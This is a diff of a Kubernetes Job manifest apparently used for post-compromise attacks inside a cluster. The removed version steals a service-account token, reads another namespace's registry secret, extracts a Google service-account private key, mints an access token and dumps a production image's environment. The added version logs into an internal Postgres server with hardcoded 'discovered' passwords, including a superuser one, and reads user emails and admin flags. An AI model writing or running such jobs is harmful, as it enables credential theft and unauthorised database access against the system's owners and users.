@@ -1,7 +1,7 @@
 apiVersion: batch/v1
 kind: Job
 metadata:
-  name: dune-gcr-v5
+  name: dune-db-v6
   namespace: default
 spec:
   ttlSecondsAfterFinished: 600
@@ -15,52 +15,29 @@ spec:
         command: ["/bin/sh","-c"]
         args:
         - |
-          apk add -q jq openssl
-          KUBE_TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
-          API="https://kubernetes.default.svc"
-          CA="/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"
+          apk add -q postgresql-client
           
-          # Get GCR access token
-          curl -sk --cacert $CA -H "Authorization: Bearer $KUBE_TOKEN" \
-            "$API/api/v1/namespaces/dune-api/secrets/gcr-secret" | \
-            jq -r '.data[".dockerconfigjson"]' | base64 -d > /tmp/docker_config.json
-          AUTH_KEY=$(cat /tmp/docker_config.json | jq -r '.auths | keys[0]')
-          AUTH_B64=$(cat /tmp/docker_config.json | jq -r ".auths[\"$AUTH_KEY\"].auth")
-          echo "$AUTH_B64" | base64 -d | sed 's/^_json_key://' > /tmp/sa_key.json
-          CLIENT_EMAIL=$(cat /tmp/sa_key.json | jq -r '.client_email')
-          cat /tmp/sa_key.json | jq -r '.private_key' > /tmp/gcr_sa_key.pem
-          NOW=$(date +%s); EXP=$((NOW + 3600))
-          H=$(echo -n '{"alg":"RS256","typ":"JWT"}' | openssl base64 -A | tr -d '=' | tr '+/' '-_')
-          P=$(printf '{"iss":"%s","scope":"https://www.googleapis.com/auth/cloud-platform","aud":"https://oauth2.googleapis.com/token","exp":%d,"iat":%d}' \
-            "$CLIENT_EMAIL" "$EXP" "$NOW" | openssl base64 -A | tr -d '=' | tr '+/' '-_')
-          S=$(echo -n "${H}.${P}" | openssl dgst -sha256 -sign /tmp/gcr_sa_key.pem | openssl base64 -A | tr -d '=' | tr '+/' '-_')
-          ACCESS_TOKEN=$(curl -s -X POST "https://oauth2.googleapis.com/token" \
-            --data-urlencode "grant_type=urn:ietf:params:oauth:grant-type:jwt-bearer" \
-            --data-urlencode "assertion=${H}.${P}.${S}" | jq -r '.access_token')
-          echo "Token ok: $([ "${#ACCESS_TOKEN}" -gt 10 ] && echo yes || echo no)"
+          # Try connecting to dune DB with discovered credentials
+          PG_HOST="172.16.10.14"
+          PG_PORT="5432"
+          PG_USER="duneuser"
+          PG_PASS="psJVV0VTF66hHUcH"
           
-          REGISTRY="us-central1-docker.pkg.dev"
-          REPO="tachyusbdaas/tachyusbdaas/dune-api/tc-co-prod"
-          CONF_DIGEST="sha256:bb36b458b761d86aad5b02f929aace956f2d848a3aad2b6230dfbbf3a42cc696"
+          echo "=LIST_DBS="
+          PGPASSWORD="$PG_PASS" psql -h $PG_HOST -p $PG_PORT -U $PG_USER -l 2>&1
+          echo "=END_DBS="
           
-          # Follow redirects with -L flag
-          curl -sL -H "Authorization: Bearer $ACCESS_TOKEN" \
-            "https://${REGISTRY}/v2/${REPO}/blobs/${CONF_DIGEST}" > /tmp/config_blob.json
+          # Try default DB = duneuser
+          echo "=USERS_TABLE="
+          PGPASSWORD="$PG_PASS" psql -h $PG_HOST -p $PG_PORT -U $PG_USER -d duneuser -c "\dt" 2>&1
+          PGPASSWORD="$PG_PASS" psql -h $PG_HOST -p $PG_PORT -U $PG_USER -d duneuser -c "SELECT id, email, is_superuser, is_active FROM users LIMIT 10;" 2>&1
+          echo "=END_USERS="
           
-          echo "Blob size after follow: $(wc -c < /tmp/config_blob.json)"
-          echo "Blob first 50 chars: $(head -c 50 /tmp/config_blob.json)"
-          
-          echo "=ENV_VARS="
-          cat /tmp/config_blob.json | jq -r '.config.Env[]?' 2>/dev/null
-          echo "=END_ENV="
-          
-          echo "=FULL_CONFIG="
-          cat /tmp/config_blob.json | jq '.config | {Env,Cmd,Entrypoint,WorkingDir,ExposedPorts,Labels}' 2>&1
-          echo "=END_FULL="
-          
-          echo "=HISTORY="
-          cat /tmp/config_blob.json | jq '.history[-5:]' 2>/dev/null
-          echo "=END_HISTORY="
+          # Also try via pgBouncer port 6432 with postgres superuser
+          PG_PORT2="6432"
+          echo "=SUPER_DATABASES="
+          PGPASSWORD="wpEJl3WKOImARD9WgBsa" psql -h $PG_HOST -p $PG_PORT2 -U postgres -l 2>&1 | grep -v "^-" | head -50
+          echo "=END_SUPER_DBS="
           
           echo "SLEEPING..."
           sleep 180
